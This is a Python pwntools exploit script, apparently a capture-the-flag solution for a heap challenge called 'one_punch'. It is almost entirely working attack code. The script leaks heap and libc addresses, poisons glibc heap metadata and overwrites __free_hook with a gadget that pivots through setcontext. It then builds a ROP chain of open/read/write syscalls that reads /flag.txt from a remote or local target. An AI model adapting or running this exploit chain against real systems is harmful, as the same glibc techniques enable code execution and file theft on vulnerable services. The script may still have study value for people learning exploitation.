from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))
		

def cmd(c):
	p.recvuntil("> ")
	p.sendline(str(c))
	
def add(idx,name):
	cmd(1)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)
def dele(idx):
	cmd(4)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def show(idx):
	cmd(3)
	p.recvuntil("idx: ")
	p.sendline(str(idx))

def edit(idx,name):
	cmd(2)
	p.recvuntil("idx: ")
	p.sendline(str(idx))
	p.recvuntil("name: ")
	p.send(name)

def main(host,port=26976):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./one_punch")
		# debug(0x0000000000015BB)
		gdb.attach(p,"b *setcontext+53")
	add(2, 'a' * 0x217)
	for i in range(2):
		add(0, 'a' * 0x217)
		dele(0)
	show(0)
	p.recvuntil(": ")
	heap = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x480
	for i in range(5):
		add(0, 'a' * 0x217)
		dele(0)
	dele(2)
	show(2)
	p.recvuntil(": ")
	libc.address = u64(p.recvuntil("\n",drop=True).ljust(8,b"\x00")) - 0x1e4ca0
	info("heap : " + hex(heap))
	info("libc : " + hex(libc.address))
	
	length = 0xe0
	add(0, 'a' * length)
	add(0, 'a' * 0x80)
	edit(2, b'\x00' * length + p64(0) + p64(0x21))
	dele(0)
	edit(2, b'\x00' * length + p64(0) + p64(0x31))
	dele(0)
	edit(2, b'\x00' * length + p64(0) + p64(0x3a1))
	dele(0)
	
	for i in range(3):
		add(1, 'b' * 0x3a8)
		dele(1)
	edit(2, b'\x00' * length + p64(0x300) + p64(0x570) + p64(0) + p64(0) + p64(heap + 0x40) + p64(heap + 0x40))
	dele(0)
	add(0, b'c' * 0x100 + p64(libc.symbols['__free_hook']))
	cmd(str(50056))
	# 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; 
	p.send(p64(libc.address+0x000000000012be97))
	# 0x7f903816ae35 <setcontext+53>:	mov    rsp,QWORD PTR [rdx+0xa0]
	# 0x7f903816ae3c <setcontext+60>:	mov    rbx,QWORD PTR [rdx+0x80]
	# 0x7f903816ae43 <setcontext+67>:	mov    rbp,QWORD PTR [rdx+0x78]
	# 0x7f903816ae47 <setcontext+71>:	mov    r12,QWORD PTR [rdx+0x48]
	# 0x7f903816ae4b <setcontext+75>:	mov    r13,QWORD PTR [rdx+0x50]
	# 0x7f903816ae4f <setcontext+79>:	mov    r14,QWORD PTR [rdx+0x58]
	# 0x7f903816ae53 <setcontext+83>:	mov    r15,QWORD PTR [rdx+0x60]
	# 0x7f903816ae57 <setcontext+87>:	mov    rcx,QWORD PTR [rdx+0xa8]
	# 0x7f903816ae5e <setcontext+94>:	push   rcx
	# 0x7f903816ae5f <setcontext+95>:	mov    rsi,QWORD PTR [rdx+0x70]
	# 0x7f903816ae63 <setcontext+99>:	mov    rdi,QWORD PTR [rdx+0x68]
	# 0x7f903816ae67 <setcontext+103>:	mov    rcx,QWORD PTR [rdx+0x98]
	# 0x7f903816ae6e <setcontext+110>:	mov    r8,QWORD PTR [rdx+0x28]
	# 0x7f903816ae72 <setcontext+114>:	mov    r9,QWORD PTR [rdx+0x30]
	# 0x7f903816ae76 <setcontext+118>:	mov    rdx,QWORD PTR [rdx+0x88]
	# 0x7f903816ae7d <setcontext+125>:	xor    eax,eax
	# 0x7f903816ae7f <setcontext+127>:	ret    
	# 00000000000026542: pop rdi; ret;
	# 0x000000000012bdc9: pop rdx; pop rsi; ret;
	# 0x0000000000047cf8: pop rax; ret;
	# 0x00000000000cf6c5: syscall; ret;x
	p_rdi = 0x0000000000026542+libc.address
	p_rdx_rsi = 0x000000000012bdc9+libc.address
	p_rax = 0x0000000000047cf8+libc.address
	syscall_ret = 0x00000000000cf6c5+libc.address
	payload = p64(libc.symbols["setcontext"]+53)+p64(heap+0x1ac0)
	payload += b'/flag.txt'+b'\x00'*7
	payload += p64(0)*9	#offset 0x68
	payload += p64(heap+0x1ad0)	#rdi
	payload += p64(0)		#rsi
	payload += p64(heap+0x2000)	#rbp
	payload += p64(0)*2		#rbx and rdx
	payload += p64(0)*2
	payload += p64(heap+0x1b78)	# rsp
	payload += p64(p_rax)		#rcx
	payload += p64(0xdeadbeef)
	payload += p64(2)
	payload += p64(syscall_ret)
	payload += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x80)+p64(heap+0x2d00)+p64(p_rax)+p64(0)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(1)+p64(p_rax)+p64(1)+p64(syscall_ret)
	payload += p64(p_rdi)+p64(0)+p64(p_rax)+p64(0)+p64(syscall_ret)
	edit(1,payload)
	dele(1)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	main(args['REMOTE'])